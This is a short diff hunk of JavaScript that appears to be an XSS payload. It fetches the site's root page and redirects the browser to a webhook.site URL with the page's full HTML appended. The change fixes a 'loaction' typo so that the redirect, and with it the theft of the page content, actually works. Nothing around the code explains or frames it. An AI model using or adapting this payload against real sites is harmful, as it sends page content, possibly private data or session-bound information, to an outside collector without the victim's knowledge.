@@ -15,7 +15,7 @@ fetch('/')
         // var docArticle = doc.querySelector('article').innerHTML;
 
         var url = "https://webhook.site/bb581fce-351d-4b88-96fd-ab230a1465fd?c=" + doc.body.outerHTML;
-        document.loaction.replace(url);
+        document.location.replace(url);
     })
     .catch(function(err) {  
         console.log('Failed to fetch page: ', err);  
